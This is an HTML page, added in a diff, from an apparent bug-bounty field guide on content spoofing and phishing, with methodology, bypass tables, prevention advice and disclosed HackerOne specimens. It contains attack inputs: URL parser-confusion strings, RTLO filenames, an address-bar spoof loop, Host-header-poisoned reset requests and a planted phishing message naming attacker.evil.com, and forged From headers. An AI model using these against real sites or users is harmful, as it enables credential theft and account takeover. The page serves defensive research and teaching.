@@ -1,0 +1,1048 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Content Spoofing &amp; Phishing · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Content Spoofing &amp; Phishing</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="on" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-high)"></span>Vulnerabilities</div>
+      <h1>Content Spoofing &amp; Phishing</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>74</b></span><span class="chip">No direct PortSwigger lab</span></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Spoofing is making an attacker-controlled thing <strong>look like</strong> a trusted thing — a domain, a sender, a link, an app name, the browser address bar, a download source — so a human (or an automated trust decision) acts on it. Phishing is the delivery: turning that spoof into credential theft, malware install, or fraud. Unlike injection or memory corruption there is no code to run in the target origin; the bug lives in the <strong>gap between what a system checks and what a human sees</strong>.</p>
+<p>Nearly every spoof is a <strong>differential</strong>: two components disagree about the same value. A URL parser reads a hostname one way and the browser navigates another; a filter checks the raw bytes while the human reads the rendered glyphs; a mail gateway keys a ticket on a <code>From</code> header nobody authenticated. Find the two components, feed them a value they read differently, and the trusted label ends up attached to attacker content.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Enumerate trust surfaces.</strong> For every place the product renders identity or provenance — links, sender addresses, app/display names, the address bar, download/permission prompts, error-page text — note <em>what string is shown as trustworthy</em>.</li><li><strong>Find the two components.</strong> Identify the thing that <strong>checks</strong> (a URL parser, a uniqueness filter, an SPF/DMARC engine, a scheme allowlist) and the thing that <strong>acts/renders</strong> (the browser, the glyph renderer, the mailbox, the click).</li><li><strong>Feed a differential value.</strong> Send hostiles that the checker and the actor read differently: <code>%60</code>/<code>@</code>/<code>/\</code>/backslash in URLs, BIDI/invisible unicode in text, a spoofed <code>From</code> at an unenforced domain, a disallowed scheme past a client-side check.</li><li><strong>Confirm the divergence.</strong> The rendered/acted result shows the trusted label while the real destination/host/sender is yours. Screenshot the trusted string plus the attacker origin.</li><li><strong>Attach the trusted-context action.</strong> The spoof itself is not the finding — the credential prompt, the token-bearing reset link, the ticket created "as" the victim, the <code>.exe</code> that reads <code>.mp3</code> is. Weaponize into that action.</li><li><strong>For email surfaces, fingerprint first.</strong> Check SPF/DKIM/DMARC on the apex <em>and staff subdomains</em> before touching the app — a <code>p=none</code> domain is spoofable with a fake mailer alone.</li></ol>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Spoofing bugs die when one component owns the decision. Before spending time, confirm the checker and the actor are genuinely <em>different</em> code paths — if the same parser both decides trust and navigates, there is no gap to split.</div></div>
+<h2 class="sec" id="spoofing-surfaces"><span class="tick">§</span>Spoofing surfaces</h2>
+<p>Find which surface you're on, then split its checker from its actor.</p>
+<h3 class="sub" id="url-parser-vs-browser-resolver-confusion">URL parser vs browser resolver confusion</h3>
+<p>Any place the app parses a URL to make a trust decision (is this host trusted / internal / same-origin?) while the browser resolves the <em>same</em> string to a different host. Feed backtick, <code>@</code>, mixed slashes, and backslash and diff how each side reads <code>hostname</code>.</p>
+<div class="pre" data-lang="http">http://TARGET%60x.COLLAB/       # url.parse host=TARGET ; WHATWG host=TARGET`x.COLLAB  (#255991)
+/\COLLAB/path                   # sanitizer=relative ; browser=absolute cross-origin   (#306414)
+https:\\//COLLAB/               # backslash defeats scheme parser -&gt; homograph host     (#59375)
+http://TARGET@COLLAB/           # userinfo: human reads TARGET, real host is COLLAB     (#268984)</div>
+<h3 class="sub" id="link-masking-homograph-markdown-chat">Link masking &amp; homograph (markdown / chat)</h3>
+<p>Rich-text, markdown, and chat renderers let the <strong>display text</strong> be set independently of the real <code>href</code>. A URL-looking display string can point anywhere, and mobile/desktop clients show no status-bar hover to reveal it. Pair with a homograph/IDN domain to defeat even a careful reader.</p>
+<div class="pre" data-lang="text">Slack markup:  &lt;http://COLLAB/login|http://TARGET.com&gt;          # shows TARGET, navigates COLLAB   (#481472)
+Markdown link: [http://TARGET.com](https://xn--trget-COLLAB.com) # IDN/punycode look-alike           (#29491, #59375)</div>
+<h3 class="sub" id="bidi-rtl-invisible-unicode">BIDI / RTL &amp; invisible unicode</h3>
+<p>Any text surface that renders raw unicode is a spoofing sink. A bidirectional override (U+202E) reverses only the <em>display</em> order, not the bytes — so an extension/URL filter checking the real string passes while the human sees a benign name. Invisible spaces clone identifiers past a uniqueness filter. Test the full invisible set, not just U+200B.</p>
+<div class="pre" data-lang="text"># Send the RAW codepoints (U+202E / U+180E) inline; the display reverses/hides, the real bytes stay
+song&lt;U+202E&gt;3pm.exe          # renders "songexe.mp3"                         (#196222, #298)
+Twitter Web App&lt;U+180E&gt;      # renders identical to the trusted app name     (#785243)</div>
+<h3 class="sub" id="browser-trust-ui-spoofing-address-bar-download-prompt">Browser trust-UI spoofing (address bar / download prompt)</h3>
+<p>On mobile the address bar is the only trust anchor. Race the bar update against content load: repeatedly interrupt navigation so the bar keeps a trusted URL (with lock icon) while attacker content stays rendered. Separately, download/permission prompts that derive "source" from the referrer instead of the real content host let malware appear to come from a trusted domain.</p>
+<div class="pre" data-lang="js">// Address-bar spoof: bar shows TARGET + lock, body stays attacker-controlled  (#175958)
+setInterval(function () { location = 'https://TARGET.com'; }, 10);</div>
+<h3 class="sub" id="email-authentication-spf-dkim-dmarc">Email authentication (SPF / DKIM / DMARC)</h3>
+<p>Before any app testing, fingerprint the mail posture. A missing or <code>p=none</code> DMARC, a softfail SPF (<code>~all</code>), or an unclaimed <code>include</code> on a shared ESP means you can send mail <em>as</em> the domain with a fake mailer. Check staff subdomains too — the apex is often hardened while <code>staff.TARGET.com</code> is not.</p>
+<div class="pre" data-lang="bash">dig +short TXT TARGET.com | grep -i spf     # ~all (softfail) or missing = spoofable
+dig +short TXT _dmarc.TARGET.com            # p=none / absent = delivered to inbox
+dig +short TXT _dmarc.staff.TARGET.com      # staff/sub-domains are frequently unenforced (#575, #117097)</div>
+<h3 class="sub" id="send-from-our-trusted-domain-features">"Send from our trusted domain" features</h3>
+<p>Share-via-email, invite, welcome, notify, and send-to-friend flows that ship attacker-controlled text/links from a <strong>verified sender</strong>. You inherit the target domain's deliverability and DKIM trust, bypassing spam heuristics. Test whether recipient and body are arbitrary, whether the message can be re-triggered unbounded, and whether sandbox/user content is labelled.</p>
+<div class="pre" data-lang="http">POST /api-umbrella/v1/users.json?api_key=… HTTP/1.1
+Host: TARGET.com
+
+user[first_name]=Visit this URL to re-verify your account&amp;user[email]=VICTIM&amp;
+options[example_api_url]=https://COLLAB&amp;options[send_welcome_email]=true
+# VICTIM receives a legitimately DKIM-signed mail from noreply@TARGET with attacker content  (#360171)</div>
+<h3 class="sub" id="email-to-ticket-from-header-injection">Email-to-ticket / From-header injection</h3>
+<p>Helpdesks (Freshdesk, Zendesk) and any "email in → object created" pipeline that keys the created object on the <strong>unauthenticated</strong> SMTP <code>From</code>. Spoof the victim's address to a fake mailer and a ticket appears authored "as" them; agents may then act on it. When a fix filters the branded alias, retry the vendor wildcard.</p>
+<div class="pre" data-lang="http">From: VICTIM@example.com                 # spoofed via emkei.cz
+To: support@TARGET.freshdesk.com         # wildcard survives after branded alias is filtered  (#2109382)
+Subject: Account deletion request
+
+# a ticket is created "as" the victim -&gt; impersonation / social engineering  (#2001913, #2079502)</div>
+<h3 class="sub" id="native-prompt-spoofing-401-basic-auth-scheme-dialog">Native prompt spoofing (401 Basic-Auth / scheme dialog)</h3>
+<p>An unproxied remote-subresource param (<code>image_src</code>, <code>url</code>) fetched cross-origin, pointed at a host returning <code>401 WWW-Authenticate: Basic</code>, raises the browser's <strong>native</strong> credential dialog attributed to the trusted parent origin. The victim types creds into what looks like a first-party prompt.</p>
+<div class="pre" data-lang="http">GET /player?image_src=https://COLLAB/admin HTTP/1.1
+Host: TARGET.com
+# COLLAB/admin -&gt; HTTP/1.1 401 Unauthorized / WWW-Authenticate: Basic realm="login"
+# victim sees a native login dialog "from" TARGET; creds + IP/UA leak to COLLAB   (#221328)</div>
+<h3 class="sub" id="reflected-content-text-injection-error-404-pages">Reflected content / text injection (error &amp; 404 pages)</h3>
+<p>Unfiltered <code>app</code>/<code>dir</code>/<code>message</code>/path values echoed verbatim into page text (no HTML needed) let an attacker plant a convincing message on a trusted domain — "your session expired, call this number" on a real <code>TARGET.com/404</code>. Low-impact alone, but it borrows the domain's authority for the phish.</p>
+<div class="pre" data-lang="http">GET /nonexistent?message=Your+account+is+locked.+Call+1-800-COLLAB+to+restore HTTP/1.1
+Host: TARGET.com
+# value reflected into the 404 body as trusted-looking text  (#106348, #106350, #145463, #1245051)</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Trust decision on a parsed host</td><td><code>%60</code> backtick: <code>url.parse</code> host=<code>TARGET</code>, WHATWG host=<code>TARGET</code>x.COLLAB`</td><td>#255991</td></tr><tr><td>Anti-tabnabbing <code>rel=noopener</code></td><td><code>/\host</code> read relative by sanitizer, absolute by browser — keeps <code>window.opener</code></td><td>#306414</td></tr><tr><td>Scheme/host URL parser</td><td>backslash <code>https:\\//</code> defeats the parser → IDN homograph host renders</td><td>#59375</td></tr><tr><td>Homograph external-link interstitial</td><td>secondary view (raw/preview) skips the warning code path</td><td>#59375</td></tr><tr><td>Invisible-char uniqueness filter</td><td>filter blocks U+200B but not U+180E (Mongolian vowel separator)</td><td>#785243</td></tr><tr><td>BIDI display filter</td><td>U+202E reverses only display, not bytes → <code>.exe</code> reads <code>.mp3</code></td><td>#196222</td></tr><tr><td>Client-side scheme allowlist</td><td>edit the raw API request; <code>tel:</code>/custom schemes accepted server-side</td><td>#500348</td></tr><tr><td>Fixed branded support alias</td><td>route past it via the vendor wildcard <code>support@&lt;t&gt;.freshdesk.com</code></td><td>#2109382</td></tr><tr><td>DMARC <code>p=reject</code></td><td>a forwarder rewrites <code>From</code> and re-signs with its own passing DKIM/SPF</td><td>#2109320</td></tr><tr><td>SPF hardfail on apex</td><td>a <strong>staff subdomain</strong> or unclaimed shared-ESP <code>include</code> is still open</td><td>#575, #117097</td></tr><tr><td>Download-source display</td><td>prompt shows the referrer, not the real content host</td><td>#2888770</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>Spoofing filters are almost always <strong>incomplete blocklists</strong>, and the interesting bug is the regression. When a domain fixes forward-slash homographs, test backslash (#59375); when it blocks U+200B, test U+180E (#785243); when it filters a branded alias, test the wildcard (#2109382). Re-test every prior fix's neighbours.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>Spoofing is usually the <strong>delivery</strong> stage of a larger chain — the trusted label is the primer, not the payload.</p>
+<ul><li><strong>Header-poisoned reset → token theft → ATO.</strong> A reset email built from the request <code>Host</code>/<code>X-Forwarded-Host</code> (or reflecting <code>X-Forwarded-For</code> into the body) ships a poisoned link from the trusted sender; the victim clicks and the token lands on the attacker host (#791293). See <code>auth</code> / host-header-injection.</li><li><strong>DMARC laundering via a relay.</strong> A forwarder that rewrites <code>From</code> and re-signs with its own high-reputation domain carries a <code>DMARC=reject</code> spoof straight into the inbox, unflagged (#2109320).</li><li><strong>Reverse tabnabbing.</strong> A masked or <code>/\host</code> link opens an attacker tab with <code>window.opener</code> intact, which redirects the <em>parent</em> tab to a phish (#306414). Pairs with <code>open-redirect</code>.</li><li><strong>Parser confusion → whitelist/shield bypass.</strong> A spoofed trusted host re-enables a security setting for an attacker origin (#255991); overlaps SSRF filter bypass.</li><li><strong>RTLO / invisible-unicode → malware install or consent spoof.</strong> A <code>.exe</code> displays as <code>.mp3</code> (#196222); an OAuth app clones a trusted name to spoof the consent screen (#785243).</li><li><strong>Native-prompt / download spoof → credential or malware trust.</strong> A <code>401</code> prompt attributed to the trusted origin harvests creds (#221328); a download prompt showing the referrer makes attacker bytes look first-party (#2888770).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>One parser, one decision.</strong> The component that decides "is this host trusted" must be the same one that navigates/fetches (#255991, #306414). Never let a sanitizer and the browser disagree on <code>hostname</code>.</li><li><strong>Normalize and neutralize unicode on render.</strong> Strip/escape BIDI-control characters, normalize invisible/zero-width codepoints in names, and render IDN hosts as <strong>punycode on every UI surface</strong> (#196222, #785243, #29491).</li><li><strong>Show the real content host</strong> on download and security prompts, never the referrer (#2888770).</li><li><strong>Enforce SPF hardfail + DKIM + DMARC <code>p=reject</code></strong> on the apex <em>and</em> staff subdomains; validate inbound DMARC and ARC-seal before forwarding — do not rewrite <code>From</code> (#575, #2109320).</li><li><strong>Verify sender ownership</strong> on email-to-ticket intake (SPF/DKIM enforcement + confirmed account) and disable vendor wildcard ticket creation (#2001913, #2109382).</li><li><strong>Build trusted-email links from a server-configured canonical host</strong>, never from client-supplied headers (#791293).</li><li><strong>Enforce scheme allowlists server-side</strong> (not just in the UI), proxy/whitelist remote-subresource params, and label sandbox/user-supplied content in outbound mail (#500348, #221328, #1128701).</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Fake mailers</strong> — emkei.cz and similar, to test SPF/DKIM/DMARC delivery with a forged <code>From</code>.</li><li><strong><code>dig TXT</code> / MXToolbox / dmarcian</strong> — SPF, DKIM, and DMARC posture on apex and subdomains.</li><li><strong>Burp Suite</strong> — Repeater to tamper past client-side scheme checks (#500348); Proxy to swap <code>Host</code>/<code>X-Forwarded-*</code> on reset flows (#791293).</li><li><strong>A <code>401</code>-responding collaborator host</strong> — for native Basic-Auth prompt injection (#221328).</li><li><strong>Unicode/homoglyph references</strong> — jkorpela.fi/chars/spaces and the U+180E/U+202E code points for invisible-char and BIDI testing.</li><li><strong>Node <code>url.parse</code> vs <code>new URL()</code></strong> — a two-line diff harness to surface parser-confusion hostname splits (#255991).</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>74</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-2888770" style="--sv:var(--sev-high)" data-sev="3" data-votes="86" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Download-origin spoofing: browser shows Referer not real source</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#2888770</b> · brave · awarded · 86 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The download-confirmation UI derives the displayed 'source' from the referring page URL instead of the URL the file actually came from, so an attacker page can make a malicious download appear to originate from a trusted domain.</p>
+<h4>Method</h4><ol><li>Host an attacker page that triggers a download</li><li>Cause the download to be attributed to a trusted referrer while the file bytes come from attacker infrastructure</li><li>Download prompt shows the trusted domain (e.g. google.com) as the source</li></ol>
+<div class="pre">Victim visits https://ybt01.github.io/upload/google.html#
+Clicks 'download' -&gt; Brave download alert displays https://google.com (referrer) as origin instead of the real host</div>
+<p class="insight"><b>Insight —</b> On any download/security prompt, verify the shown 'source/origin' is the actual content host, not the referrer or the top-level page. Referrer-derived provenance is a spoofing sink that helps malware appear trusted.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2888770" target="_blank" rel="noopener">hackerone.com/reports/2888770</a></span><a class="src" href="#report-2888770" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-791293" style="--sv:var(--sev-high)" data-sev="3" data-votes="30" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Password-reset link/content poisoning via request headers</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#791293</b> · endless_group · none · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>endless_group</b></span><span>Surface <b>web</b></span><span>Chain <b>header injection -&gt; poisoned reset email -&gt; token thef</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The password-reset email builds the reset link from the request Host header (and reflects other headers like X-Forwarded-For), so an attacker triggering a victim's reset can control the domain/content of the link in the trusted email and harvest the token or phish the user.</p>
+<h4>Method</h4><ol><li>Intercept the password-reset request</li><li>Change the Host header (or inject X-Forwarded-For text) to an attacker-controlled value</li><li>Victim receives the email; clicking the poisoned link sends the reset token to the attacker's host</li></ol>
+<div class="pre">POST /reset_password
+Host: attacker.evil.com
+# reset email now links to https://attacker.evil.com/...token=...
+
+# variant (244677): X-Forwarded-For reflected verbatim into email body
+X-Forwarded-For: For precaution, send your new password to attacker@evil.com or visit www.evil.com</div>
+<p class="insight"><b>Insight —</b> Password-reset emails that derive the link/base URL from client-controlled headers (Host, X-Forwarded-Host, X-Forwarded-For) are a classic ATO/phishing primitive - test header rewriting on every reset flow and watch the delivered email.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/791293" target="_blank" rel="noopener">hackerone.com/reports/791293</a></span><a class="src" href="#report-791293" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-295339" style="--sv:var(--sev-high)" data-sev="3" data-votes="29" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Mailsploit: From-header sender spoofing via encoded-word/null-byte</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#295339</b> · ibb · none · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Email clients decode RFC 2047 encoded-word sequences (and mishandle null bytes/control chars) in the From header when rendering the sender, but MTAs treat the header as opaque ASCII. The client displays an attacker-chosen sender address that the mail servers never see, so DMARC/DKIM/SPF and spam filters are not triggered.</p>
+<h4>Method</h4><ol><li>Craft a From header whose displayed address is built from RFC2047 encoded-words containing the spoofed address plus a null byte/control char to truncate the real one</li><li>Send through any MTA (server sees benign header, passes auth)</li><li>Vulnerable client decodes and shows the spoofed sender to the recipient</li></ol>
+<div class="pre">From: =?utf-8?b?&lt;base64 of: spoofed@trusted.com\x00&gt;?=@attacker.com
+# client renders 'spoofed@trusted.com'; MTA sees attacker.com and passes SPF/DKIM/DMARC</div>
+<p class="insight"><b>Insight —</b> Sender identity shown in a mail client can diverge from the SMTP-authenticated address whenever the client decodes encoded-words or mishandles null/control chars in From. Test clients by sending encoded-word/null-byte From headers; MTA-transparent spoofing bypasses DMARC entirely. Some clients also XSS on the decoded value.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/295339" target="_blank" rel="noopener">hackerone.com/reports/295339</a></span><a class="src" href="#report-295339" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-255991" style="--sv:var(--sev-high)" data-sev="3" data-votes="21" data-bounty="200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Host spoofing via legacy url.parse vs WHATWG URL parser confusion</h3><span class="fieldmark">◆ High</span></div>
+<div class="catalog">Specimen <b>#255991</b> · brave · 200 · 21 votes · resolved</div>
+<div class="taxo"><span>Program <b>brave</b></span><span>Surface <b>desktop</b></span><span>Chain <b>Parser confusion -&gt; security-setting/whitelist bypass (e.</b></span><span>Tag <b>cors</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Brave's renderer resolves http://brave.com%60x.evil.com/ to host evil.com (WHATWG/Chrome parser), while the Node layer applying security decisions uses legacy url.parse which reads host as brave.com - so shield/whitelist settings for brave.com are applied to an attacker origin.</p>
+<h4>Method</h4><ol><li>Set a security setting for a trusted host (toggle Brave shield for brave.com)</li><li>Navigate to http://brave.com%60x.attacker.com/</li><li>Renderer loads attacker.com but the security layer keys the decision on brave.com</li></ol>
+<div class="pre">http://brave.com%60x.code-fu.org/
+// url.parse -&gt; hostname: 'brave.com'
+// new URL()  -&gt; hostname: 'brave.com`x.code-fu.org'</div>
+<p class="insight"><b>Insight —</b> Two different URL parsers in one trust decision = spoofing/SSRF-filter bypass. When one component decides 'is this host trusted/internal' and another actually fetches, feed URLs with backtick, @, backslash, %-encoding, or extra hosts and diff how each parser reads hostname. Classic in Node apps mixing url.parse and WHATWG URL.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/255991" target="_blank" rel="noopener">hackerone.com/reports/255991</a></span><a class="src" href="#report-255991" style="color:var(--faint)">#</a></div></article>
+<article class="spec" id="report-2109320" style="--sv:var(--sev-med)" data-sev="2" data-votes="42" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
